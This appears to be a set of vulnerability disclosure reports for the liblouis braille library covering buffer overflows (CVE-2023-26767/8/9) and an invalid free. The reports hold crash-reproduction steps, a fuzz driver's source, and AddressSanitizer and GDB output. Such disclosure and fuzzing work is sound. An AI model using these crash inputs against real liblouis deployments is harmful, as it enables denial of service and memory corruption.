# poc-API-6223f21-lou_logFile-BO (CVE-2023-26768)
## Summary
When long filename (larger than 256) is given to API `lou_logFile()`, there will be a global-buffer-overflow.

https://github.com/liblouis/liblouis/blob/517f6f1f35fc5c57ac2f045caa168191bdeaadde/liblouis/logging.c#L123-L130

## Test Environment
Ubuntu 16.04.3 LTS  
liblouis (master, 6223f21)

## How to trigger
1. Compile liblouis with AddressSanitizer
2. Compile the [fuzz driver](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/driver-API-6223f21-lou_logFile-BO.c) and [poc file](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/poc-API-6223f21-lou_logFile-BO)
3. Compile the fuzz driver: `$ clang -g -fsanitize=address,fuzzer ./driver-API-6223f21-lou_logFile-BO.c ./bin_asan/lib/liblouis.a -I ./bin_asan/include/liblouis/ -o driver-API-6223f21-lou_logFile-BO`
4. run the compiled driver: `$ ./driver-API-6223f21-lou_logFile-BO poc-API-6223f21-lou_logFile-BO`

## ASAN report
```
$ ./driver-API-6223f21-lou_logFile-BO poc-API-6223f21-lou_logFile-BO
Minimum size is 0
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 2700932249
INFO: Loaded 1 modules   (57 inline 8-bit counters): 57 [0x7b0360, 0x7b0399), 
INFO: Loaded 1 PC tables (57 PCs): 57 [0x5705c0,0x570950), 
./driver-API-6223f21-lou_logFile-BO: Running 1 inputs 1 time(s) each.
Running: poc-API-6223f21-lou_logFile-BO
=================================================================
==20412==ERROR: AddressSanitizer: global-buffer-overflow on address 0x00000108b6e0 at pc 0x00000050dbf8 bp 0x7ffe6a0ffac0 sp 0x7ffe6a0ff280
WRITE of size 4098 at 0x00000108b6e0 thread T0
    #0 0x50dbf7 in strcpy /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5
    #1 0x55492e in lou_logFile /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/logging.c:130:34
    #2 0x553634 in AFG_func /opt/disk/marsman/liblouis/6223f21/./driver-API-6223f21-lou_logFile-BO.c:17:2
    #3 0x553850 in LLVMFuzzerTestOneInput /opt/disk/marsman/liblouis/6223f21/./driver-API-6223f21-lou_logFile-BO.c:44:2
    #4 0x459911 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:599:15
    #5 0x4435d2 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:323:6
    #6 0x449940 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:856:9
    #7 0x4738c2 in main /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #8 0x7f8ea559983f in __libc_start_main /build/glibc-S7Ft5T/glibc-2.23/csu/../csu/libc-start.c:291
    #9 0x41e0d8 in _start (/opt/disk/marsman/liblouis/6223f21/driver-API-6223f21-lou_logFile-BO+0x41e0d8)

0x00000108b6e0 is located 0 bytes to the right of global variable 'initialLogFileName' defined in '../../code/liblouis/logging.c:121:13' (0x108b5e0) of size 256
SUMMARY: AddressSanitizer: global-buffer-overflow /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5 in strcpy
Shadow bytes around the buggy address:
  0x000080209680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9
  0x000080209690: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9
  0x0000802096a0: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9
  0x0000802096b0: f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9 00 00 00 00
  0x0000802096c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0000802096d0: 00 00 00 00 00 00 00 00 00 00 00 00[f9]f9 f9 f9
  0x0000802096e0: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000802096f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080209700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080209710: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080209720: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==20412==ABORTING
```

# poc-lou_trace-6223f21-resolveSubtable-BO (CVE-2023-26769)
## Summary
When long name table is given to `lou_trace`, there will be a heap-buffer-overflow.

https://github.com/liblouis/liblouis/blob/63722f0428cd4e98d7446658162fb71732d892bb/liblouis/compileTranslationTable.c#L4543-L4565

Because liblouis does not check the length of the input table name, when the table name is longer than `MAXSTRING * sizeof(char) * 2`, there will be a heap-buffer-overflow.

## Test Environment
Ubuntu 16.04.3 LTS
liblouis (master, 6223f21)

## How to trigger
1. Compile the liblouis with AddressSanitizer
2. Run command: `$ ./lou_trace $(python -c "print('a'*4096)")`

## Details

### Asan report
```
$ ./bin_asan/bin/lou_trace $(python -c "print('a'*4096)")
=================================================================
==14488==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x621000002500 at pc 0x000000481e48 bp 0x7ffc8ead9480 sp 0x7ffc8ead8c40
WRITE of size 4097 at 0x621000002500 thread T0
    #0 0x481e47 in strcpy /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5
    #1 0x4cddca in resolveSubtable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4565:2
    #2 0x4cddca in _lou_defaultTableResolver /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4682:27
    #3 0x4ce442 in _lou_resolveTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4723:22
    #4 0x4d00a5 in compileTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4884:22
    #5 0x4d00a5 in getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:5061:7
    #6 0x4d2742 in _lou_getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4970:2
    #7 0x4d2742 in lou_getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4982:2
    #8 0x4c8712 in main /opt/disk/marsman/liblouis/6223f21/build_asan/tools/../../code/tools/lou_trace.c:392:7
    #9 0x7fef5e7bd83f in __libc_start_main /build/glibc-S7Ft5T/glibc-2.23/csu/../csu/libc-start.c:291
    #10 0x41b718 in _start (/opt/disk/marsman/liblouis/6223f21/bin_asan/bin/lou_trace+0x41b718)

0x621000002500 is located 0 bytes to the right of 4096-byte region [0x621000001500,0x621000002500)
allocated by thread T0 here:
    #0 0x49676d in malloc /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:145:3
    #1 0x4cdc27 in resolveSubtable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4543:22
    #2 0x4cdc27 in _lou_defaultTableResolver /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4682:27
    #3 0x4ce442 in _lou_resolveTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4723:22
    #4 0x4d00a5 in compileTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4884:22
    #5 0x4d00a5 in getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:5061:7
    #6 0x4d2742 in _lou_getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4970:2
    #7 0x4d2742 in lou_getTable /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:4982:2
    #8 0x4c8712 in main /opt/disk/marsman/liblouis/6223f21/build_asan/tools/../../code/tools/lou_trace.c:392:7
    #9 0x7fef5e7bd83f in __libc_start_main /build/glibc-S7Ft5T/glibc-2.23/csu/../csu/libc-start.c:291

SUMMARY: AddressSanitizer: heap-buffer-overflow /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5 in strcpy
Shadow bytes around the buggy address:
  0x0c427fff8450: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8460: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8470: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8490: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c427fff84a0:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff84b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff84c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff84d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff84e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff84f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==14488==ABORTING
```

### GDB report
```
*** Error in `/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace': double free or corruption (out): 0x000000000064ee30 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7ffff7a847f5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8038a)[0x7ffff7a8d38a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7ffff7a9158c]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x426f29]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x402ea8]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x402f8e]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x403842]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x403ff6]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x401448]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d840]
/opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace[0x401039]
======= Memory map: ========
00400000-00431000 r-xp 00000000 08:11 46443387                           /opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace
00630000-00631000 r--p 00030000 08:11 46443387                           /opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace
00631000-00632000 rw-p 00031000 08:11 46443387                           /opt/disk/marsman/liblouis/6223f21/bin_normal/bin/lou_trace
00632000-00669000 rw-p 00000000 00:00 0                                  [heap]
7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 
7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 
7ffff77f7000-7ffff780d000 r-xp 00000000 08:02 4461034                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff780d000-7ffff7a0c000 ---p 00016000 08:02 4461034                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:02 4461034                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:02 4456715                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:02 4456715                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:02 4456715                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:02 4456715                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 
7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:02 4456700                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7fd1000-7ffff7fd4000 rw-p 00000000 00:00 0 
7ffff7ff6000-7ffff7ff7000 rw-p 00000000 00:00 0 
7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:02 4456700                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:02 4456700                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffdc000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

---Type <return> to continue, or q <return> to quit---
Program received signal SIGABRT, Aborted.
0x00007ffff7a42438 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54
54      ../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
(gdb) bt
#0  0x00007ffff7a42438 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54
#1  0x00007ffff7a4403a in __GI_abort () at abort.c:89
#2  0x00007ffff7a847fa in __libc_message (do_abort=do_abort@entry=2, fmt=fmt@entry=0x7ffff7b9dfd8 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
#3  0x00007ffff7a8d38a in malloc_printerr (ar_ptr=<optimized out>, ptr=<optimized out>, str=0x7ffff7b9e0e8 "double free or corruption (out)", action=3) at malloc.c:5020
#4  _int_free (av=<optimized out>, p=<optimized out>, have_lock=0) at malloc.c:3874
#5  0x00007ffff7a9158c in __GI___libc_free (mem=<optimized out>) at malloc.c:2975
#6  0x0000000000426f29 in rpl_free (p=0x4ab9, p@entry=0x64ee30) at ../../code/gnulib/free.c:48
#7  0x0000000000402ea8 in resolveSubtable (table=<optimized out>, base=<optimized out>, searchPath=<optimized out>) at ../../code/liblouis/compileTranslationTable.c:4601
#8  _lou_defaultTableResolver (tableList=<optimized out>, base=<optimized out>) at ../../code/liblouis/compileTranslationTable.c:4682
#9  0x0000000000402f8e in _lou_resolveTable (tableList=0x4ab9 <error: Cannot access memory at address 0x4ab9>, tableList@entry=0x7fffffffcfce 'a' <repeats 200 times>..., 
    base=0x4ab9 <error: Cannot access memory at address 0x4ab9>, base@entry=0x0) at ../../code/liblouis/compileTranslationTable.c:4723
#10 0x0000000000403842 in compileTable (tableList=0x7fffffffcfce 'a' <repeats 200 times>..., displayTableList=0x7fffffffcfce 'a' <repeats 200 times>..., translationTable=0x7fffffffb8f8, 
    displayTable=0x7fffffffb908) at ../../code/liblouis/compileTranslationTable.c:4884
#11 getTable (translationTableList=translationTableList@entry=0x7fffffffcfce 'a' <repeats 200 times>..., displayTableList=displayTableList@entry=0x7fffffffcfce 'a' <repeats 200 times>..., 
    translationTable=<optimized out>, translationTable@entry=0x7fffffffc988, displayTable=<optimized out>, displayTable@entry=0x7fffffffc990) at ../../code/liblouis/compileTranslationTable.c:5061
#12 0x0000000000403ff6 in _lou_getTable (tableList=0x4ab9 <error: Cannot access memory at address 0x4ab9>, tableList@entry=0x7fffffffcfce 'a' <repeats 200 times>..., 
    displayTableList=0x4ab9 <error: Cannot access memory at address 0x4ab9>, displayTableList@entry=0x7fffffffcfce 'a' <repeats 200 times>..., translationTable=<optimized out>, 
    displayTable=<optimized out>) at ../../code/liblouis/compileTranslationTable.c:4970
#13 lou_getTable (tableList=0x4ab9 <error: Cannot access memory at address 0x4ab9>, tableList@entry=0x7fffffffcfce 'a' <repeats 200 times>...)
    at ../../code/liblouis/compileTranslationTable.c:4982
#14 0x0000000000401448 in main (argc=<optimized out>, argv=0x7fffffffcc38) at ../../code/tools/lou_trace.c:392
```


# poc-API-6223f21-lou_setDataPath-BO (CVE-2023-26767)

## Summary
When long path (larger than MAXSTRING, i.e., 2048) is given to API `lou_setDataPath()`, there will be a global-buffer-overflow.

Similar to #1291, because liblouis does not check the input length.

https://github.com/liblouis/liblouis/blob/63722f0428cd4e98d7446658162fb71732d892bb/liblouis/compileTranslationTable.c#L58-L62

## Test Environment
Ubuntu 16.04.3 LTS
liblouis (master, 6223f21)

## How to trigger
1. Compile liblouis with AddressSanitizer
2. Compile the [fuzz driver](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/driver-API-6223f21-lou_setDataPath-BO.c) and [poc file](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/poc-API-6223f21-lou_setDataPath-BO)
3. Compile the fuzz driver: `$ clang -g -fsanitize=address,fuzzer ./driver-API-6223f21-lou_setDataPath-BO.c ./bin_asan/lib/liblouis.a -I ./bin_asan/include/liblouis/ -o driver-API-6223f21-lou_setDataPath-BO`
4. run the compiled driver: `$ ./driver-API-6223f21-lou_setDataPath-BO poc-API-6223f21-lou_setDataPath-BO`

## ASAN report
```
$ ./driver-API-6223f21-lou_setDataPath-BO poc-API-6223f21-lou_setDataPath-BO
Minimum size is 0
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 1537783897
INFO: Loaded 1 modules   (2848 inline 8-bit counters): 2848 [0x80bf40, 0x80ca60), 
INFO: Loaded 1 PC tables (2848 PCs): 2848 [0x5b9668,0x5c4868), 
./driver-API-6223f21-lou_setDataPath-BO: Running 1 inputs 1 time(s) each.
Running: poc-API-6223f21-lou_setDataPath-BO
=================================================================
==29969==ERROR: AddressSanitizer: global-buffer-overflow on address 0x0000010e85a0 at pc 0x00000050dc38 bp 0x7ffed6135f90 sp 0x7ffed6135750
WRITE of size 4098 at 0x0000010e85a0 thread T0
    #0 0x50dc37 in strcpy /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5
    #1 0x553af6 in lou_setDataPath /opt/disk/marsman/liblouis/6223f21/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:62:2
    #2 0x553674 in AFG_func /opt/disk/marsman/liblouis/6223f21/./driver-API-6223f21-lou_setDataPath-BO.c:16:2
    #3 0x553890 in LLVMFuzzerTestOneInput /opt/disk/marsman/liblouis/6223f21/./driver-API-6223f21-lou_setDataPath-BO.c:43:2
    #4 0x459951 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:599:15
    #5 0x443612 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:323:6
    #6 0x449980 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:856:9
    #7 0x473902 in main /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #8 0x7fdb3926383f in __libc_start_main /build/glibc-S7Ft5T/glibc-2.23/csu/../csu/libc-start.c:291
    #9 0x41e118 in _start (/opt/disk/marsman/liblouis/6223f21/driver-API-6223f21-lou_setDataPath-BO+0x41e118)

0x0000010e85a0 is located 0 bytes to the right of global variable 'dataPath' defined in '../../code/liblouis/compileTranslationTable.c:59:14' (0x10e7da0) of size 2048
SUMMARY: AddressSanitizer: global-buffer-overflow /local/mnt/workspace/bcain_clang_vm-bcain-aus_3184/final/llvm-project/compiler-rt/lib/asan/asan_interceptors.cpp:423:5 in strcpy
Shadow bytes around the buggy address:
  0x000080215060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080215070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080215080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080215090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000802150a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0000802150b0: 00 00 00 00[f9]f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x0000802150c0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x0000802150d0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x0000802150e0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x0000802150f0: f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9
  0x000080215100: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==29969==ABORTING
```

# poc-API-3d95765-parseQuery-SEGV

Segment fault in `parseQuery()`
## Summary
When call API `lou_findTable` with specific file, there will be SEGV in `parseQuery()` at liblouis/metadata.c:586:5

https://github.com/liblouis/liblouis/blob/42af0893e7ac47761ac5ed33c04e43f541f67c46/liblouis/metadata.c#L575-L586

In liblouis/metadata.c:575 there is `if (!v) v = "yes";` and in liblouis/metadata.c:586 liblouis `free(v)`

## Test Environment
Ubuntu 24.04.1, 64bit  
liblouis (master, 3d95765)

## How to trigger
1. Compile liblouis with AddressSanitizer
2. Compile the fuzz driver, the fuzz driver code is:
    ```C
    // This fuzz driver is generated for library liblouis, aiming to fuzz the following functions:
    // lou_setDataPath at compileTranslationTable.c:59:1 in liblouis.h
    // lou_indexTables at metadata.c:895:1 in liblouis.h
    // lou_findTable at metadata.c:1002:1 in liblouis.h
    // lou_getTableInfo at metadata.c:1073:1 in liblouis.h
    #include <stdint.h>
    #include <stddef.h>
    #include <string.h>
    #include <stdlib.h>
    #include <stdio.h>
    #include <liblouis.h>
    #include <stdint.h>
    #include <stdlib.h>
    #include <string.h>

    int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
        if (Size < 1) return 0;

        // Set up a dummy data path
        lou_setDataPath("./dummy_file");

        // Call lou_indexTables before lou_findTable
        char *tables[] = {"bin_asan/share/liblouis/tables/afr-za-g1.ctb", NULL};
        lou_indexTables(tables);

        // Use the input data to create a query string
        char *query = (char *)malloc(Size + 1);
        if (!query) return 0;
        memcpy(query, Data, Size);
        query[Size] = '\0';

        // Find a table based on the query
        char *table = lou_findTable(query);
        if (table) {
            // Get table info using a dummy key
            char *info = lou_getTableInfo(table, "dummy_key");
            if (info) {
                free(info); // Use free instead of lou_free for strings
            }
            free(table); // Use free instead of lou_free for strings
        }

        // Clean up
        lou_free(); // Call lou_free without arguments
        free(query);
        return 0;
    }

    int main(int argc, char **argv) {
        if (argc < 2) {
        printf("need file input");
        return -1;
        }
        FILE *file = fopen(argv[1], "rb");
        if (file == NULL) {
            perror("fail to open file");
            return 1;
        }

        fseek(file, 0, SEEK_END);
        size_t Size = ftell(file);
        rewind(file);

        char *Data = (char *)malloc(Size + 1);
        fread(Data, 1, Size, file);
        LLVMFuzzerTestOneInput(Data, Size);
        free(Data);
        fclose(file);
    }
    ```
    The compile command is:
    ```bash
    $ clang ./driver-API-3d95765-parseQuery-SEGV.c -o ./driver-API-3d95765-parseQuery-SEGV -fsanitize=address,undefined -I./bin_asan/include/liblouis ./bin_asan/lib/liblouis.a -lyaml -g
    ```
3. Download the [poc file](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/poc-API-3d95765-parseQuery-SEGV) and run the compiled driver: `$ ./driver-API-6223f21-lou_setDataPath-BO poc-API-6223f21-lou_setDataPath-BO`

## ASAN report
```
$ ./driver-API-3d95765-parseQuery-SEGV poc-API-3d95765-parseQuery-SEGV 
warning: lou_setDataPath is deprecated.
AddressSanitizer:DEADLYSIGNAL
=================================================================
==743108==ERROR: AddressSanitizer: SEGV on unknown address 0x5fdd76ffe450 (pc 0x5fdd76eb57c6 bp 0x000000000000 sp 0x7ffd758717c0 T0)
==743108==The signal is caused by a WRITE memory access.
    #0 0x5fdd76eb57c6 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-parseQuery-SEGV+0x467c6) (BuildId: 84429c59a4ee44f9c90d92673ea84dbbef3f595b)
    #1 0x5fdd76f4dfdf in free (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-parseQuery-SEGV+0xdefdf) (BuildId: 84429c59a4ee44f9c90d92673ea84dbbef3f595b)
    #2 0x5fdd76fce1b2 in parseQuery /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:586:5
    #3 0x5fdd76fcd6fb in lou_findTable /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:1004:24
    #4 0x5fdd76f8ca45 in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/latest/./driver-API-3d95765-parseQuery-SEGV.c:33:19
    #5 0x5fdd76f8cd35 in main /home/yuwei/afgen/afgenllm/database/liblouis/latest/./driver-API-3d95765-parseQuery-SEGV.c:66:5
    #6 0x7febc442a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #7 0x7febc442a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #8 0x5fdd76eb33c4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-parseQuery-SEGV+0x443c4) (BuildId: 84429c59a4ee44f9c90d92673ea84dbbef3f595b)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/home/yuwei/afgen/afgenllm/database/liblouis/latest/driver-API-3d95765-parseQuery-SEGV+0x467c6) (BuildId: 84429c59a4ee44f9c90d92673ea84dbbef3f595b) in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType)
==743108==ABORTING
```